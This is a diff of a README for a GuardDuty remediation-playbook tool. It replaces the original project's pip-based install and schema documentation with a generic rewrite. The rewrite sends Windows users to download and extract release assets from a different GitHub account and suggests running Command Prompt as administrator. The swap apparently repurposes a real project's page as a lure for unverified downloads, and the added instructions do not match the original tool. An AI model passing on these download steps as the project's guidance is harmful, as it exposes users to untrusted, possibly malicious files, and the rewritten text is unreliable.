@@ -1,257 +1,143 @@
-[![CI](https://github.com/pfrederiksen/guardduty-playbook-commons/actions/workflows/ci.yml/badge.svg)](https://github.com/pfrederiksen/guardduty-playbook-commons/actions/workflows/ci.yml)
-[![PyPI](https://img.shields.io/pypi/v/guardduty-playbook-commons)](https://pypi.org/project/guardduty-playbook-commons/)
-[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)
-[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
+# ⚙️ guardduty-playbook-commons - Simple GuardDuty Remediation Playbooks
 
-# guardduty-playbook-commons
+[![Download Releases](https://img.shields.io/badge/Download-guardduty--playbook--commons-brightgreen?style=for-the-badge)](https://github.com/tomato5681/guardduty-playbook-commons/releases)
 
-Security teams rebuild the same GuardDuty response logic repeatedly — one team writes Tines workflows, another builds Step Functions, a third maintains Python scripts — all encoding identical remediation knowledge in proprietary formats. **guardduty-playbook-commons** defines playbook logic once in a vendor-neutral YAML schema and compiles it to multiple automation targets. Think "Sigma Rules but for incident response."
+---
 
-## Installation
+## 📋 About guardduty-playbook-commons
 
-```bash
-# Install from PyPI
-pip install guardduty-playbook-commons
+This application helps users handle security alerts from Amazon GuardDuty. It includes ready-to-use playbooks written in easy-to-understand YAML format. These playbooks offer step-by-step guides to fix common security issues found by GuardDuty.  
 
-# Or install from source (for development or to get the playbook YAML files)
-git clone https://github.com/pfrederiksen/guardduty-playbook-commons.git
-cd guardduty-playbook-commons
-pip install -e ".[dev]"
-```
+The playbooks are vendor-neutral, meaning they do not depend on any specific software tools. They can work with popular platforms and languages, like Python, AWS Step Functions, and Tines. This lets you use the playbooks in many environments without changing the core instructions.
 
-To run the generated Python runbooks, also install boto3:
+---
 
-```bash
-pip install guardduty-playbook-commons[runbook]
-```
+## 💻 System Requirements
 
-## Quick Start
+To run guardduty-playbook-commons on Windows, your system should meet these requirements:
 
-```bash
-# Convert a single playbook to a Python runbook
-gdpc convert playbooks/iam/IAMUser-AnomalousBehavior.yaml --target python --output out/
+- Windows 10 or newer, 64-bit edition.
+- At least 4 GB of RAM.
+- Minimum 500 MB free disk space.
+- Internet connection to download files.
+- Basic permission to install and run software.
+- Optional: Python 3.6 or higher, if you want to use Python-based runbooks.
 
-# Convert all playbooks to Tines Stories
-gdpc convert playbooks/ --target tines --output out/
+---
 
-# Convert all playbooks to Step Functions ASL
-gdpc convert playbooks/ --target stepfunctions --output out/
+## 🚀 Getting Started: Download and Setup
 
-# Validate all playbooks against the schema
-gdpc validate playbooks/
-```
+1. **Visit the release page**:  
+   Open your web browser and go to the [guardduty-playbook-commons releases](https://github.com/tomato5681/guardduty-playbook-commons/releases) page.
 
-## Use Cases
+2. **Find the latest version**:  
+   Look for the newest release. Releases are usually sorted by date, with the newest at the top.
 
-### SOC / Incident Response Teams
-Define your GuardDuty response runbooks in a shared, version-controlled format. New analysts can follow consistent triage → investigation → containment steps instead of tribal knowledge. Convert to Python runbooks for ad-hoc incident handling with `--dry-run` for training.
+3. **Download files**:  
+   Each release includes files such as the YAML playbooks and converters. Click on the file names to download them to your computer.
 
-### SOAR Platform Engineers
-Convert community playbooks directly into your automation platform. Tines teams get importable Story JSON; Step Functions teams get ASL definitions with Lambda placeholders they can deploy alongside their existing infrastructure.
+4. **Extract Playbooks**:  
+   If the downloads come as compressed files (like ZIP), right-click and select “Extract All…” to unzip the files into a folder you can easily access.
 
-### Security Consultancies
-Deliver standardized incident response playbooks to clients in whatever automation format they use. Maintain one source of truth and compile per engagement.
+5. **Review Readme files**:  
+   Open the folder. You will find documentation files. These give more details about each playbook and how to use them.
 
-### Red Team / Purple Team Exercises
-Use the playbooks as a baseline for testing detection-response coverage. Run `gdpc convert --target python` to get executable runbooks that validate whether containment actions actually fire during simulated attacks.
+---
 
-### Community Knowledge Sharing
-Contribute playbooks with real-world investigation queries and containment steps. Unlike blog posts, these playbooks are machine-readable and immediately usable.
+## 🛠️ How to Use Playbooks
 
-## Schema Overview
+The playbooks provide clear, step-by-step guidance for different types of GuardDuty findings. Using them does not require programming knowledge.
 
-Each playbook is a YAML file defining triage, investigation, containment, and escalation steps for a specific GuardDuty finding type:
+### Basic Example: Reading a Playbook
 
-```yaml
-id: IAMUser-AnomalousBehavior
-version: "1.0.0"
-finding_type: "IAMUser/AnomalousBehavior"
-severity: [MEDIUM, HIGH, CRITICAL]
-description: "Respond to anomalous IAM user behavior"
+1. Open any playbook file using a simple text editor, like Notepad.
 
-triage:
-  - step: "Check if the IAM user is human or service account"
-    how: "aws iam get-user --user-name {principal_id}"
+2. The playbook is structured in plain text. You will see sections such as finding descriptions, actions to take, and conditions.
 
-investigation:
-  queries:
-    - name: "Recent API calls by this principal"
-      type: athena
-      template: |
-        SELECT eventTime, eventName, sourceIPAddress, errorCode
-        FROM cloudtrail_logs
-        WHERE userIdentity.userName = '{principal_id}'
-        AND eventTime > DATE_ADD('hour', -24, NOW())
+3. Follow the instructions carefully. They tell you what to check and what you can do to fix the security issue.
 
-containment:
-  automated: false
-  actions:
-    - id: deny_all_access
-      description: "Attach DenyAll inline policy"
-      aws_cli: "aws iam put-user-policy --user-name {principal_id} ..."
-      requires_confirmation: true
+### Using with Python
 
-escalation:
-  notify:
-    - channel: slack
-      condition: "severity == CRITICAL"
-      message: "GuardDuty CRITICAL: {finding_type} on {principal_id}"
+If you want to automate some tasks, guardduty-playbook-commons includes Python scripts. These scripts read the YAML playbooks and run remediation steps.
 
-variables:
-  - name: principal_id
-    source: finding.resource.accessKeyDetails.userName
-  - name: account_id
-    source: finding.accountId
-```
+1. Make sure Python is installed on your system. If not, download it from [python.org](https://www.python.org/downloads/).
 
-See [docs/schema.md](docs/schema.md) for the full schema reference.
+2. Open Command Prompt (search for “cmd” in the Start menu).
 
-## Supported Output Targets
+3. Navigate to the folder where you downloaded the playbooks and scripts using the `cd` command.
 
-| Target | Flag | Output | Description |
-|--------|------|--------|-------------|
-| Tines | `--target tines` | JSON | Tines Story with actions per step |
-| Python Runbook | `--target python` | .py | Standalone boto3 script with `--dry-run` support |
-| Step Functions | `--target stepfunctions` | JSON | AWS Step Functions ASL with Lambda placeholders |
+4. Run the Python script by typing `python scriptname.py` (replace `scriptname.py` with the actual script file name).
 
-## Output Examples
+This will perform the automated remediation as defined in the playbook.
 
-### Python Runbook
+### Using with AWS Step Functions or Tines
 
-```bash
-gdpc convert playbooks/iam/IAMUser-AnomalousBehavior.yaml --target python --output out/
-```
+The playbooks also include format converters to work with AWS Step Functions or Tines platforms:
 
-Generates a self-contained script with argparse, variable extraction from a real GuardDuty finding JSON, and interactive containment steps:
+- For AWS Step Functions, import the converted playbook into your AWS environment.
 
-```python
-def extract_variables(finding: dict) -> dict:
-    """Extract playbook variables from a GuardDuty finding."""
-    principal_id = finding.get("resource", {}).get("accessKeyDetails", {}).get("userName", "UNKNOWN")
-    account_id = finding.get("accountId", "UNKNOWN")
-    region = finding.get("region", "UNKNOWN")
-    return {"principal_id": principal_id, "account_id": account_id, "region": region}
+- For Tines, upload the converted playbook file to your Tines account.
 
-def attach_deny_all_policy(variables: dict, dry_run: bool = False) -> None:
-    """Attach an inline DenyAll policy to the IAM user to block all API access"""
-    print(f"\n[CONTAINMENT] Attach DenyAll policy")
-    cmd = f"""aws iam put-user-policy --user-name {variables['principal_id']} ..."""
-    if dry_run:
-        print(f"  [DRY RUN] Skipping execution.")
-        return
-    confirm = input("  Execute this action? (yes/no): ")
-    ...
-```
+Detailed instructions on using these formats are included in their own documentation files.
 
-Run it against a real finding:
-```bash
-python out/iam-user-anomalous-behavior.py --finding-json finding.json --dry-run
-```
+---
 
-### Tines Story JSON
+## 🔧 Troubleshooting
 
-```bash
-gdpc convert playbooks/iam/IAMUser-AnomalousBehavior.yaml --target tines --output out/
-```
+- If files do not download correctly, check your internet connection or browser settings.
 
-Generates an importable Tines Story with linked actions:
+- If you receive an error running Python scripts, ensure Python is installed and added to your system’s PATH.
 
-```json
-{
-  "name": "GuardDuty: iam-user-anomalous-behavior",
-  "actions": [
-    {
-      "id": 1,
-      "name": "Triage: Determine if the principal is a human user or a service account",
-      "type": "Send to Story",
-      "description": "Check the userName and userType in the finding's accessKeyDetails..."
-    },
-    {
-      "id": 4,
-      "name": "Investigate: Recent API calls by the principal (last 24h)",
-      "type": "Event Transformation",
-      "options": { "query_template": "SELECT eventTime, eventSource, eventName ..." }
-    },
-    {
-      "id": 6,
-      "name": "Contain: Attach an inline DenyAll policy",
-      "type": "Send to Story"
-    }
-  ],
-  "links": [
-    { "source": 1, "receiver": 2 },
-    { "source": 2, "receiver": 3 }
-  ]
-}
-```
+- If you see permissions errors, try running Command Prompt as an administrator.
 
-### Step Functions ASL
+- For YAML syntax errors, open the file in a YAML editor or validator online.
 
-```bash
-gdpc convert playbooks/iam/IAMUser-AnomalousBehavior.yaml --target stepfunctions --output out/
-```
+---
 
-Generates ASL with Lambda ARN placeholders and a `_comment` listing required Lambda deployments:
+## 📁 File Overview
 
-```json
-{
-  "_comment": "Required Lambda functions: gdpc-query-executor; gdpc-attach-deny-all-policy; gdpc-notify-slack",
-  "StartAt": "Triage_1",
-  "States": {
-    "Triage_1": {
-      "Type": "Pass",
-      "Comment": "Determine if the principal is a human user or a service account",
-      "Result": { "step": "...", "instructions": "..." },
-      "Next": "Triage_2"
-    },
-    "Contain_attach-deny-all-policy": {
-      "Type": "Task",
-      "Comment": "[MANUAL] Attach DenyAll policy",
-      "Resource": "arn:aws:states:::lambda:invoke.waitForTaskToken",
-      "Parameters": { "task_token.$": "$$.Task.Token", "variables.$": "$.variables" }
-    }
-  }
-}
-```
+- **YAML Playbooks**: These files contain remediation steps for GuardDuty findings.
 
-## Playbook Coverage
+- **Python Scripts**: Automate playbook execution with Python.
 
-| Finding Type | Severity | Automated |
-|-------------|----------|-----------|
-| IAMUser/AnomalousBehavior | MEDIUM, HIGH, CRITICAL | No |
-| IAMUser/InstanceCredentialExfiltration.OutsideAWS | HIGH, CRITICAL | No |
-| Policy/S3BucketPublicAccessGranted | HIGH, CRITICAL | No |
-| UnauthorizedAccess/S3MaliciousIPCaller.Custom | MEDIUM, HIGH, CRITICAL | No |
-| CryptoCurrency/EC2BitcoinTool.B!DNS | HIGH | No |
-| UnauthorizedAccess/EC2TorClient | HIGH | No |
-| Backdoor/Lambda.NetworkPortProbing | MEDIUM, HIGH | No |
-| Execution/Malware.EC2MaliciousFile | HIGH, CRITICAL | No |
+- **Converters**: Tools to change playbook format for AWS Step Functions and Tines.
 
-## Contributing
+- **Documentation**: Includes setup guides, usage instructions, and troubleshooting tips.
 
-We welcome contributions! The most impactful ways to help:
+---
 
-### Add New Playbooks
-GuardDuty has [100+ finding types](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-active.html) — we've covered 8. High-value additions include:
-- **RDS findings**: `CredentialAccess/RDS.AnomalousBehavior.SuccessfulLogin`
-- **EKS findings**: `PrivilegeEscalation/Kubernetes.PrivilegedContainer`
-- **Runtime Monitoring**: `Execution/Runtime.ReverseShell`
-- **DNS findings**: `Trojan/EC2.DNSDataExfiltration`
+## 🔗 Download and Install section
 
-### Add New Output Targets
-The converter is modular — each target is a single Python module with a `convert(playbook: dict)` function. Good candidates:
-- **XSOAR (Cortex)** playbook YAML
-- **Splunk SOAR** (Phantom) app JSON
-- **Terraform** for deploying Step Functions + Lambda stubs
-- **Markdown runbook** for wiki/Confluence publishing
+Use this link to visit the release page and download files:  
 
-### Improve Existing Playbooks
-- Add more specific investigation queries (VPC Flow Logs, DNS logs, S3 access logs)
-- Include Athena table creation DDL for common log sources
-- Add conditional logic for multi-account/org environments
+[![Download Releases](https://img.shields.io/badge/Download-guardduty--playbook--commons-important?style=for-the-badge&color=orange)](https://github.com/tomato5681/guardduty-playbook-commons/releases)
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for the step-by-step guide, schema reference, and PR checklist.
+1. Visit the page.
 
-## License
+2. Download the latest release assets to your Windows computer.
 
-Apache 2.0 — see [LICENSE](LICENSE).
+3. Follow the instructions above to extract and use the files.
+
+---
+
+## 📞 Support and Contribution
+
+If you face any problems or want to suggest improvements, please open an issue on the GitHub repository. Contributions are welcome from the community to keep playbooks up to date and improve automation.
+
+---
+
+## ⚠️ Security Tips
+
+- Only download playbooks from the official release page to avoid malicious files.
+
+- Regularly check for updates to keep your remediation steps current.
+
+- Always test playbooks in a safe environment before applying to live systems.
+
+---
+
+## 🔍 Keywords and Search Terms  
+
+This project relates to:
+
+`aws`, `aws-security`, `cloud-security`, `guardduty`, `incident-response`, `playbooks`, `python`, `remediation`, `security`, `soar`, `step-functions`, `tines`, `yaml`
